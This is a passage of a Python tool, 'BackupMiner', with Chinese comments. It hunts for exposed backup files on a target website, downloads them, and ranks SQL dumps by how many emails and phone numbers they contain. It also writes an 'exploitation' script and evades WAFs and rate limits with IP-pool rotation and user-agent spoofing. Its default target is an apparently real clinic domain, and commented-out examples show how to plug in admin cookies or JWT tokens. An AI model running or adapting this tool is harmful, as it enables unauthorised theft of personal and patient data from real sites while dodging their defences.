        # 保存JSON报告
        report_file = os.path.join(self.output_dir, f'backup_miner_smart_{timestamp}.json')
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, ensure_ascii=False, indent=2, default=str)
            
        # 生成利用脚本
        self._generate_exploitation_scripts(timestamp, analysis)
        
        # 生成HTML报告
        self._generate_html_report(timestamp, report, analysis)
        
        # 打印智能摘要
        self._print_smart_summary(report, analysis)
        
        print(f"\n 智能化备份挖掘完成!")
        print(f" 详细报告: {report_file}")

    def _analyze_backup_results(self):
        """分析备份挖掘结果"""
        analysis = {
            'risk_assessment': {
                'overall_risk': 'low',
                'critical_findings': [],
                'high_risk_findings': [],
                'medium_risk_findings': []
            },
            'recommendations': []
        }
        
        # 风险评估
        total_sensitive_data = 0
        critical_backups = []
        
        for data in self.extracted_data:
            if data.get('type') == 'sql':
                # SQL备份风险评估
                if data.get('emails', 0) > 100 or data.get('phones', 0) > 100:
                    critical_backups.append(data['file'])
                    analysis['risk_assessment']['critical_findings'].append(
                        f"SQL备份包含大量个人信息: {data['file']}"
                    )
                elif data.get('tables', 0) > 20:
                    analysis['risk_assessment']['high_risk_findings'].append(
                        f"大型数据库备份: {data['file']} ({data['tables']}个表)"
                    )
                
                total_sensitive_data += data.get('emails', 0) + data.get('phones', 0)
        
        # 总体风险评估
        if critical_backups or total_sensitive_data > 1000:
            analysis['risk_assessment']['overall_risk'] = 'critical'
        elif len(self.found_backups) > 5 or total_sensitive_data > 100:
            analysis['risk_assessment']['overall_risk'] = 'high'
        elif len(self.found_backups) > 0:
            analysis['risk_assessment']['overall_risk'] = 'medium'
        
        # 生成建议
        recommendations = []
        
        if analysis['risk_assessment']['overall_risk'] == 'critical':
            recommendations.extend([
                "立即删除或限制所有发现的备份文件访问",
                "紧急审查备份存储策略和访问控制",
                "检查是否有数据泄露事件"
            ])
        
        if len(self.found_backups) > 0:
            recommendations.extend([
                "实施备份文件访问控制",
                "定期检查备份文件暴露情况",
                "加密敏感备份文件"
            ])
        
        recommendations.extend([
            "建立备份安全管理制度",
            "定期进行备份安全扫描",
            "培训运维人员备份安全意识"
        ])
        
        analysis['recommendations'] = recommendations
        
        return analysis

    def _group_by_discovery_method(self):
        """按发现方法分组统计"""
        groups = {}
        for backup in self.found_backups:
            method = backup.get('discovery_method', 'unknown')
            if method not in groups:
                groups[method] = 0
            groups[method] += 1
        return groups

    def _generate_exploitation_scripts(self, timestamp, analysis):
        """生成利用脚本"""
        if not self.downloaded_files:
            return
            
        # Bash利用脚本
        script_file = os.path.join(self.output_dir, f'exploit_backups_{timestamp}.sh')
        with open(script_file, 'w') as f:
            f.write("#!/bin/bash\n")
            f.write(f"# 智能化备份利用脚本\n")
            f.write(f"# 目标: {self.target_url}\n")
            f.write(f"# 生成时间: {datetime.now()}\n")
            f.write(f"# 风险等级: {analysis['risk_assessment']['overall_risk']}\n\n")
            
            f.write("echo '开始备份文件利用...'\n\n")
            
            # 分类处理不同类型的备份
            sql_files = [d for d in self.downloaded_files if d['filename'].lower().endswith('.sql')]
            zip_files = [d for d in self.downloaded_files if d['filename'].lower().endswith('.zip')]
            
            if sql_files:
                f.write("# SQL文件处理\n")
                f.write("echo 'SQL备份文件:'\n")
                for sql in sql_files:
                    f.write(f"echo '  - {sql['filename']} ({self.format_size(sql['size'])})'\n")
                    f.write(f"# 恢复命令: mysql -u root -p database_name < {sql['local_path']}\n")
                f.write("\n")
            
            if zip_files:
                f.write("# ZIP文件处理\n")
                f.write("echo 'ZIP备份文件:'\n")
                for zip_file in zip_files:
                    f.write(f"echo '  - {zip_file['filename']} ({self.format_size(zip_file['size'])})'\n")
                    f.write(f"# 解压命令: unzip {zip_file['local_path']} -d extracted/\n")
                f.write("\n")
                
            f.write(f"echo '所有文件位于: {self.output_dir}/downloads/'\n")
            f.write(f"ls -la {self.output_dir}/downloads/\n")
                
            os.chmod(script_file, 0o755)
            
        print(f" 利用脚本: {script_file}")

    def _generate_html_report(self, timestamp, report, analysis):
        """生成HTML可视化报告"""
        html_file = os.path.join(self.output_dir, f'backup_report_{timestamp}.html')
        
        with open(html_file, 'w', encoding='utf-8') as f:
            html_content = f"""<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>智能化备份挖掘报告</title>
    <style>
        body {{{{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }}}}
        .container {{{{ max-width: 1200px; margin: 0 auto; background: white; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }}}}
        .header {{{{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; border-radius: 10px 10px 0 0; }}}}
        .header h1 {{{{ margin: 0; font-size: 2.5em; }}}}
        .content {{{{ padding: 30px; }}}}
        .section {{{{ margin-bottom: 40px; }}}}
        .section h2 {{{{ color: #333; border-bottom: 3px solid #667eea; padding-bottom: 10px; }}}}
        .stats-grid {{{{ display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin: 20px 0; }}}}
        .stat-card {{{{ background: #f8f9fa; padding: 20px; border-radius: 8px; border-left: 4px solid #667eea; }}}}
        .stat-number {{{{ font-size: 2em; font-weight: bold; color: #667eea; }}}}
        .risk-critical {{{{ border-left-color: #dc3545; color: #dc3545; }}}}
        .risk-high {{{{ border-left-color: #fd7e14; color: #fd7e14; }}}}
        .risk-medium {{{{ border-left-color: #ffc107; color: #ffc107; }}}}
        .risk-low {{{{ border-left-color: #28a745; color: #28a745; }}}}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>智能化备份挖掘报告</h1>
            <div class="meta">
                <p>目标: {self.target_url}</p>
                <p>扫描时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
                <p>扫描器版本: BackupMiner v2.0 (Enhanced)</p>
            </div>
        </div>
        
        <div class="content">
            <div class="section">
                <h2>扫描概览</h2>
                <div class="stats-grid">
                    <div class="stat-card">
                        <div class="stat-number">{len(self.found_backups)}</div>
                        <div>发现的备份文件</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">{len(self.downloaded_files)}</div>
                        <div>成功下载的文件</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">{self.format_size(sum(f.get('size', 0) for f in self.downloaded_files))}</div>
                        <div>总下载大小</div>
                    </div>
                    <div class="stat-card risk-{analysis['risk_assessment']['overall_risk']}">
                        <div class="stat-number">{analysis['risk_assessment']['overall_risk'].upper()}</div>
                        <div>整体风险等级</div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>
</html>"""
            f.write(html_content)
        
        print(f" HTML报告: {html_file}")

    def _print_smart_summary(self, report, analysis):
        """打印智能摘要"""
        print(f"\n" + "="*80)
        print(f" 智能化备份挖掘完成!")
        print(f"="*80)
        
        # 基础统计
        print(f" 扫描统计:")
        print(f"   • 目标系统: {self.target_url}")
        print(f"   • 发现备份: {len(self.found_backups)} 个")
        print(f"   • 成功下载: {len(self.downloaded_files)} 个")
        print(f"   • 总计大小: {self.format_size(sum(f.get('size', 0) for f in self.downloaded_files))}")
        
        # 噪音过滤效果
        if NOISE_FILTER_AVAILABLE and self.noise_stats['noise_filtered'] > 0:
            total_tested = self.noise_stats['noise_filtered'] + self.noise_stats['valuable_backups']
            noise_ratio = self.noise_stats['noise_filtered'] / max(1, total_tested)
            print(f"\n 噪音过滤效果:")
            print(f"   • 过滤噪音: {self.noise_stats['noise_filtered']} 个")
            print(f"   • 有价值发现: {self.noise_stats['valuable_backups']} 个")
            print(f"   • 过滤率: {noise_ratio:.1%}")
            if noise_ratio > 0.3:
                print(f"    成功避免了备份挖掘'傻逼兴奋' - 大量噪音被过滤!")
        
        # 风险评估
        print(f"\n 风险评估:")
        print(f"   • 整体风险: {analysis['risk_assessment']['overall_risk'].upper()}")
        
        if analysis['risk_assessment']['critical_findings']:
            print(f"   • 关键发现: {len(analysis['risk_assessment']['critical_findings'])} 项")
        
        # 高价值发现
        high_value = [f for f in self.downloaded_files if f.get('value_score', 0) > 80]
        if high_value:
            print(f"\n 高价值发现:")
            for i, file_info in enumerate(high_value[:3], 1):
                print(f"   {i}. {file_info['filename']} (评分: {file_info.get('value_score', 0)})")
        
        # 技术栈信息
        if self.detected_tech_stack['language'] != 'unknown':
            print(f"\n 技术栈:")
            print(f"   • 语言: {self.detected_tech_stack['language']}")
            if self.detected_tech_stack['cms'] != 'unknown':
                print(f"   • CMS: {self.detected_tech_stack['cms']}")
        
        # 绕过增强统计（如果启用）
        if self.use_dynamic_ip or self.use_user_agent:
            print(f"\n 绕过增强统计:")
            
            if self.use_dynamic_ip and self.dynamic_ip_initialized:
                try:
                    if DYNAMIC_IP_AVAILABLE:
                        ip_stats = get_ip_stats()
                        print(f"   • 动态IP池: {ip_stats.get('working_count', 0)} 个有效IP")
                        print(f"   • IP切换次数: {ip_stats.get('switch_count', 0)}")
                except:
                    print(f"   • 动态IP池: 统计获取失败")
            elif self.use_dynamic_ip:
                print(f"   • 动态IP池: 初始化失败，已禁用")
            
            if self.use_user_agent:
                stats = self.bypass_enhancer.bypass_stats
                print(f"   • User-Agent轮换: {stats['ua_rotations']} 次")
                print(f"   • 请求头变体: {stats['header_variations']} 次")
                print(f"   • 增强请求: {stats['requests_made']} 次")
                
                # 显示当前User-Agent信息
                if self.bypass_enhancer.ua_manager:
                    try:
                        ua_info = self.bypass_enhancer.ua_manager.get_user_agent_info()
                        if ua_info:
                            print(f"   • 当前UA: {ua_info.get('browser', 'Unknown')} {ua_info.get('version', '')} "
                                   f"({ua_info.get('os', 'Unknown')} {ua_info.get('device', 'Desktop')})")
                    except:
                        print(f"   • 当前UA: 信息获取失败")
            else:
                print(f"   • User-Agent轮换: 未启用")
        
        # 智能速率控制效果
        rate_stats = self.rate_controller.get_stats()
        print(f"\n 智能速率控制效果:")
        print(f"   • 总请求数: {rate_stats['total_requests']}")
        print(f"   • 平均响应时间: {rate_stats['avg_response_time']:.2f}s")
        print(f"   • 请求错误率: {rate_stats['error_rate']:.1%}")
        print(f"   • 最终并发数: {rate_stats['current_concurrency']}")
        print(f"   • 最终延迟: {rate_stats['current_delay']:.2f}s")
        print(f"   • 服务器健康状态: {rate_stats['server_health']}")
        
        if rate_stats['rate_limit_detected']:
            print(f"   • 检测到速率限制，已自动调整")
        else:
            print(f"   • 未触发速率限制，扫描过程平稳")
        
        # WAF欺骗检测效果
        deception_stats = self.deception_detector.get_detection_stats()
        baseline_info = self.baseline_detector.get_baseline_info()
        
        print(f"\n WAF欺骗检测效果:")
        print(f"   • 基线建立: {baseline_info['baselines_count']}个基线")
        print(f"   • 分析的响应: {deception_stats['total_analyzed']}个")
        print(f"   • 检测到软404: {deception_stats['soft_404_detected']}个")
        print(f"   • 检测到伪装403: {deception_stats['fake_403_detected']}个")
        print(f"   • 检测到验证码拦截: {deception_stats['captcha_detected']}个")
        print(f"   • 合法响应: {deception_stats['legitimate_responses']}个")
        
        if deception_stats['total_analyzed'] > 0:
            deception_rate = deception_stats.get('deception_rate', 0)
            print(f"   • WAF欺骗率: {deception_rate:.1%}")
            
            if deception_rate > 0.3:
                print(f"     发现高强度WAF防护，智能规避策略生效！")
            elif deception_rate > 0.1:
                print(f"     发现中等强度WAF防护，成功识别并规避")
            else:
                print(f"     目标WAF防护较弱或策略较简单")
        
        print(f"\n" + "="*80)

async def main():
    import sys
    
    if len(sys.argv) > 1:
        target = sys.argv[1]
    else:
        target = input("请输入目标URL [默认: https://asanoha-clinic.com]: ").strip()
        if not target:
            target = "https://asanoha-clinic.com"
    
    # 认证配置示例（可根据需要修改）
    auth_config = None
    
    # 示例1: 用户名密码登录（管理员备份目录）
    # auth_config = {
    #     'login_url': f'{target}/admin/login',
    #     'username': 'admin',
    #     'password': 'password123',
    #     'heartbeat_endpoint': '/admin/api/status'
    # }
    
    # 示例2: 直接使用JWT token
    # auth_config = {
    #     'jwt_token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...'
    # }
    
    # 示例3: 使用现有管理员Cookies
    # auth_config = {
    #     'cookies': {
    #         'admin_session': 'admin_sess_abc123def456',
    #         'csrf_token': 'xyz789',
    #         'user_role': 'administrator'
    #     }
    # }
    
    print(f"目标 启动备份文件挖掘器")
    print(f"目标 目标: {target}")
    print(f"认证 认证模式: {'启用' if auth_config else '禁用'}")
    
    # 显示绕过模式配置
    if DYNAMIC_IP_AVAILABLE and USER_AGENT_AVAILABLE:
        print(f"绕过模式: 终极组合拳 (动态IP池 + User-Agent轮换)")
    elif USER_AGENT_AVAILABLE:
        print(f"绕过模式: User-Agent轮换模式")
    else:
        print(f"绕过模式: 基础模式")
    
    if auth_config:
        print("  启用认证模式 - 可访问认证后备份金矿！")
        print("   预期发现: 管理员备份、用户数据备份、系统配置备份")
    else:
        print("  无认证模式 - 仅访问公开备份")
        print("   提示: 修改main函数中的auth_config来启用认证")
        
    if DYNAMIC_IP_AVAILABLE or USER_AGENT_AVAILABLE:
        print("  启用绕过增强 - 提高WAF绕过能力！")
        if DYNAMIC_IP_AVAILABLE:
            print("   - 500个动态IP轮换挖掘")
        if USER_AGENT_AVAILABLE:
            print("   - 智能User-Agent伪装挖掘")
    
    miner = BackupMiner(target, auth_config=auth_config)
    results = await miner.run()
    
    print(f"\n  扫描完成！")
    print(f" 发现备份: {len(results)}")
    
    if auth_config and miner.auth_manager:
        auth_stats = miner.auth_manager.get_auth_stats()
        print(f"认证 认证请求: {auth_stats.get('authenticated_requests', 0)}")
        print(f"认证 认证失败: {auth_stats.get('auth_failures', 0)}")
        print(f"认证 会话恢复: {auth_stats.get('session_recoveries', 0)}")
    
    return results

if __name__ == "__main__":
    asyncio.run(main())